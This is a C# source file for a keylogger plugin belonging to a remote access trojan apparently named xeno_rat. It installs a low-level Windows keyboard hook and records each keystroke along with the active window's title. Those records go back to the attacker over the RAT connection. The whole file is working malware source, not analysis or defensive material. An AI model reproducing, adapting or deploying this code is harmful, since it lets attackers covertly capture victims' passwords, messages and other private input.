using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr hInstance, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x100;

        private Node node;
        private readonly List<string> SendQueue = new List<string>();

        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 }); // Indicate that it has connected

this.node = node;
IntPtr hookHandle = IntPtr.Zero;
HookCallbackDelegate hcDelegate = HookCallback;
Process currproc = Process.GetCurrentProcess();
string mainModuleName = currproc.MainModule.ModuleName;
currproc.Dispose();

new Thread(() =>
{
    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
    if (!System.Windows.Application.Current.Dispatcher.HasShutdownStarted)
    {
        System.Windows.Application.Run();
    }
}).Start();

while (node.Connected())
{
    if (SendQueue.Count > 0)
    {
        string activeWindow = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*", "");
        string chars = string.Join("", SendQueue);
        SendQueue.Clear();
        await sendKeyData(activeWindow, chars);
    }
    await Task.Delay(1);
}

if (hookHandle != IntPtr.Zero)
{
    UnhookWindowsHookEx(hookHandle);
}
        }

        public async Task sendKeyData(string openApplication, string character)
        {
            if (node == null || !node.Connected()) return;

await node.SendAsync(Encoding.UTF8.GetBytes(openApplication));
await node.SendAsync(Encoding.UTF8.GetBytes(character));
        }

        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool isShiftPressed = (GetAsyncKeyState((int) Keys.ShiftKey) & 0x8000) != 0;
                string character = GetCharacterFromKey((uint) vkCode, isShiftPressed);

                if ((((ushort) GetKeyState(0x14)) & 0xffff) != 0) // Check for caps lock
                {
                    character = character.ToUpper();
                }

SendQueue.Add(character);
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static readonly Dictionary<uint, string> NonVisibleCharacters = new Dictionary<uint, string>()
        {
        {0x08, "[backspace]"},
        {0x09, "[tab]"},
        {0x0D, "[enter]"},
        {0x1B, "[escape]"},
        {0x20, "[space]"},
        {0x2E, "[delete]"},
        {0x25, "[left]"},
        {0x26, "[up]"},
        {0x27, "[right]"},
        {0x28, "[down]"},
        // Add more non-visible characters here...
        };

        private static readonly bool[] KeyStates = new bool[256];

        private static string GetCharacterFromKey(uint virtualKeyCode, bool isShiftPressed)
        {
            StringBuilder receivingBuffer = new StringBuilder(5);
            byte[] keyboardState = new byte[256];

            // Set the state of Shift key based on the passed parameter
            keyboardState[0x10] = (byte)(isShiftPressed ? 0x80 : 0);

            // Map the virtual key to the corresponding character
            int result = ToUnicode(virtualKeyCode, 0, keyboardState, receivingBuffer, receivingBuffer.Capacity, 0);

            if (result > 0)
            {
                string character = receivingBuffer.ToString();

                // Replace non-visible characters with descriptive words using the dictionary
                if (NonVisibleCharacters.ContainsKey(virtualKeyCode))
                {
                    string nonVisibleCharacter = NonVisibleCharacters[virtualKeyCode];

                    // Apply Shift key state to the non-visible character
                    if (isShiftPressed)
                    {
                        // Apply Shift key modifications based on the non-visible character
                        switch (nonVisibleCharacter)
                        {
                            case ";":
                                return ":";
                            case "=":
                                return "+";
                            case ",":
                                return "<";
                            case "-":
                                return "_";
                            case ".":
                                return ">";
                            case "/":
                                return "?";
                            case "`":
                                return "~";
                            case "[":
                                return "{";
                            case "\\":
                                return "|";
                            case "]":
                                return "}";
                            case "'":
                                return "\"";
                        }
                    }

                    return nonVisibleCharacter;
                }

                return character;
            }

            return string.Empty;
        }

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
            int bufferSize, uint flags);
    }
}
